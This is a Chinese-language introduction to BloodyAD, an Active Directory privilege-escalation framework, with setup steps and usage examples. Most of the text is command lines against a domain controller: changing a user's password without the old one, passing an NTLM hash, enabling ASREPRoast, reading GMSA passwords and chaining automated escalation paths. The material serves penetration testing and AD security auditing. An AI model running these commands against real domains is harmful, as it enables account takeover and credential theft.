![](https://image.3001.net/images/20220211/1644522259_62056b133da151bd179bb.jpeg!small)  

## 关于BloodyAD

BloodyAD是一款功能强大的活动目录提权框架，该框架可以通过bloodyAD.py实现手动操作，或通过结合pathgen.py和autobloody.py来实现自动化提权以及活动目录安全检测任务。

该框架支持NTLM（使用密码或NTLM哈希）和Kerberos身份验证，并绑定到域控制器的LDAP/LDAPS/SAMR服务以获得活动目录权限。

除此之外，广大研究人员还可以将BloodyAD结合SOCKS代理一起使用。

该工具可以对域控制器执行特定的LDAP/SAMR调用，以获取和执行活动目录权限。

## 工具要求

该工具的正常运行需要使用到下列几个组件：

> Python 3
>
> DSinternals
>
> Impacket
>
> Ldap3

我们可以在自己的虚拟环境中使用下列命令来安装该工具所需的依赖组件：

    
    
    pip3 install -r requirements.txt

## 工具使用

### 简单使用

    
    
    python bloodyAD.py --host 172.16.1.15 -d MYDOM -u myuser -p :70016778cb0524c799ac25b439bd6a31 changePassword mytarget 'Password123!'

### 可用的功能函数列表

    
    
    [bloodyAD]$ python bloodyAD.py -h
    
    usage: bloodyAD.py [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k] [-s {ldap,ldaps,rpc}] [--host HOST]
    
    {getObjectAttributes,setAttribute,addUser,addComputer,delObject,changePassword,addObjectToGroup,
    
    addForeignObjectToGroup,delObjectFromGroup,getChildObjects,setShadowCredentials,setGenericAll,setOwner,
    
    setRbcd,setDCSync,setUserAccountControl}
    
                              ...
    
     
    
    Active Directory Privilege Escalation Framework
    
     
    
    Main options:
    
      -h, --help            显示帮助信息和退出
    
      -d DOMAIN, --domain DOMAIN
    
                           用于NTLM认证的域
    
      -u USERNAME, --username USERNAME
    
                           用于NTLM认证的用户名
    
      -p PASSWORD, --password PASSWORD
    
                           NTLM认证的明文密码或LMHASH:NTHASH
    
      -k, --kerberos
    
      -s {ldap,ldaps,rpc}, --scheme {ldap,ldaps,rpc}
    
                            通过TLS使用LDAPUse (默认为LDAP)
    
      --host HOST           DC的主机名或IP地址 (例如: my.dc.local or 172.16.1.3)
    
     
    
    Command:
    
      {getObjectAttributes,setAttribute,addUser,addComputer,delObject,changePassword,addObjectToGroup,
    
      addForeignObjectToGroup,delObjectFromGroup,getChildObjects,setShadowCredentials,setGenericAll,setOwner,
    
      setRbcd,setDCSync,setUserAccountControl}   Function to call

### 针对特定函数的使用帮助信息

    
    
    [bloodyAD]$ python bloodyAD.py --host 172.16.1.15 -d MYDOM -u myuser -p :70016778cb0524c799ac25b439bd6a31 changePassword -h
    
    usage:
    
        Change the target password without knowing the old one using LDAPS or RPC
    
        Args:
    
            identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    
            new_pass: new password for the target
    
        
    
           [-h] [func_args ...]
    
     
    
    positional arguments:
    
      func_args
    
     
    
    optional arguments:
    
      -h, --help  show this help message and exit

## 工具使用样例

 **获取组成员：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes Users member

 **获取最小密码长度策略：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes 'DC=bloody,DC=local' minPwdLength

 **获取AD功能性等级：**

    
    
    python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes 'DC=bloody,DC=local' msDS-Behavior-Version

 **获取目标域的所有用户：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' user

 **获取目标域的所有计算机：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' computer

 **获取目标域的所有容器：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' container

 **为ASREPRoast启用DONT_REQ_PREAUTH：**

    
    
    python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 setUserAccountControl john.doe 0x400000

 **禁用ACCOUNTDISABLE：**

    
    
    python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 setUserAccountControl john.doe 0x0002 False

 **获取UserAccountControl标记：**

    
    
    python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes john.doe userAccountControl

 **获取GMSA账号密码：**

    
    
    python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 -s ldaps getObjectAttributes gmsaAccount$ msDS-ManagedPassword

## autobloody

该工具可以实现两个AD对象之间的自动化AD权限，整个自动化过程分为两个部分：

> pathgen.py：使用bloodhound数据和neo4j查询来搜索提权的最优路径；
>
> autobloody.py：执行pathgen.py寻找到最优路径；

### 依赖组件

> Python 3
>
> DSinternals
>
> Impacket
>
> Ldap3
>
> BloodHound
>
> Neo4j Python驱动
>
> Neo4j（[ _GDS_ _库_](https://neo4j.com/docs/graph-data-> science/current/installation/)）

### 简单使用

    
    
    pathgen.py -dp neo4jPass -ds 'OWNED_USER@ATTACK.LOCAL' -dt 'TARGET_USER@ATTACK.LOCAL' && autobloody.py -d ATTACK -u 'owned_user' -p 'owned_user_pass' --host 172.16.1.15

## 项目地址

 **BloodyAD：** 【[ _GitHub传送门_](https://github.com/CravateRouge/bloodyAD)】

## 参考资料

[ _https://neo4j.com/docs/graph-data-science/current/installation/_](https://neo4j.com/docs/graph-data-science/current/installation/)

